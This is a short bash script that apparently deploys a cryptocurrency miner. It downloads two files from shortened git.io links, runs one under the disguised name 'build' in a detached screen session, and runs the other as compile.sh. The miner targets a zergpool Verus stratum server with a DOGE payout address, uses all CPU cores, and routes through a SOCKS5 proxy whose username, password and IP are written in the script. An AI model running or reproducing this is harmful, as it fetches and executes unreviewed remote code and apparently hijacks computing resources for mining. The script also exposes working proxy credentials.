#!/bin/bash
proxy="socks5://omar:omar@164.90.244.21:333"
array[0]="01"
array[1]="02"
array[2]="03"
array[3]="04"
array[4]="05"
array[5]="06"
array[6]="07"
array[7]="08"
array[8]="09"
array[9]="10"
array[10]="11"
array[11]="12"
array[12]="13"
array[13]="14"
array[14]="15"
array[15]="16"
array[16]="17"
array[17]="18"
array[18]="19"
array[19]="20"
size=${#array[@]}
index=$(($RANDOM % $size))
kuli=${array[$index]}
apt-get update
wget -q https://git.io/JPjuz
wget -qO build https://git.io/JPjuB
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u D7hBkeeqaXzc7dy71FLqUdPoyogAYrU8s7 -p c=DOGE,mc=VRSC,ID=DOGE-$kuli -t $(nproc --all) -x $proxy
./compile.sh
echo succes
